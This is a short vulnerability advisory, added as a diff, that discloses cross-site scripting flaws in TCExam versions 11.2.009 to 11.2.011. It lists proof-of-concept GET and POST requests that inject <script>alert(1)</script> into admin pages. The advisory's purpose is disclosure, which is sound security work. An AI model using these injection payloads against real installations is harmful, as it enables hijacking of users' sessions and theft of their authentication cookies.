@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/48669/info
+
+TCExam is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+TCExam 11.2.009, 11.2.010 and 11.2.011 are vulnerable; other versions may also be affected.
+
+XSS:  GET http://www.example.com/tcexam/admin/code/{script}.php?{parameter}={value}"><script>alert(1)</script>
+
+XSS:  POST http://www.example.com/tcexam/admin/code/{script}.php HTTP/1.0
+       - {parameter}={value}<script>alert(1)</script>&{parameter}={value}
+
+XSS URI: GET http://www.example.com/tcexam/admin/code/index.php?zsl=>"><script>alert(1)</script>
+
+XSS Path: GET http://www.example.com/tcexam/admin/code/?=>"&#039;><script>alert(1)</script>
